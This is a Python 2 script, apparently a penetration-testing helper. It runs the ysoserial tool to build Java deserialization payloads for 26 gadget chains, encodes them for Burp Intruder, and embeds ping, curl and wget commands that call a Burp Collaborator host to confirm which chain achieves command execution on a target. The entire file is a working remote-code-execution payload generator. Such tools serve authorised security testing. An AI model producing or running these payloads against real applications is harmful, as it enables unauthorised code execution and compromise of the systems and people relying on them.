"""
Usage: $ python2.7 yso-brute.py 2>/dev/null 

"""

import os 
import base64 
import urllib 

payloads = [ 
        'BeanShell1',  
        'Click1', 
        'Clojure',  
        'CommonsBeanutils1',  
        'CommonsCollections1',  
        'CommonsCollections2',  
        'CommonsCollections3',  
        'CommonsCollections4',  
        'CommonsCollections5',  
        'CommonsCollections6',  
        'CommonsCollections7', 
        'Groovy1',  
        'Hibernate1',  
        'Hibernate2',  
        'JBossInterceptors1',  
        'JRMPClient',  
        'JSON1',  
        'JavassistWeld1',  
        'Jdk7u21',  
        'MozillaRhino1', 
        'MozillaRhino2',  
        'Myfaces1',  
        'ROME',  
        'Spring1',  
        'Spring2', 
        'Vaadin1' 
 
 # The following gadgets do not accept a full OS command as a parameter. 
        # 'AspectJWeaver',   
        # 'C3P0',  
        # 'FileUpload1',   
        # 'JRMPListener',  
        # 'Jython1',  
        # 'Myfaces2',   
        # 'URLDNS',   
        # 'Wicket1' 
    ] 
 
def generate(name, cmd): 
    for payload in payloads: 
        final = cmd.replace('REPLACE', payload) 
        print('Generating ' + payload + ' for ' + name + '...') 
        command = os.popen('/path/to/java -jar /path/to/ysoserial-master-SNAPSHOT.jar ' + payload + ' "' + final + '"' + '| gzip -f') #gzip encode 
        result = command.read() 
        command.close() 
        base64_encode = base64.b64encode(result) #base64 encode 
        url_encode = urllib.quote(base64_encode) #url encode 
        if url_encode != "": 
            open('intruder.txt', 'a').write(url_encode + '\n') 
  
generate('Windows', 'ping -n 1 win.REPLACE.your.burpcollaborator.net') 
generate('Linux', 'ping -c 1 nix.REPLACE.your.burpcollaborator.net') 
generate('Curl', 'curl curl.REPLACE.your.burpcollaborator.net') 
generate('Wget', 'wget wget.REPLACE.your.burpcollaborator.net') 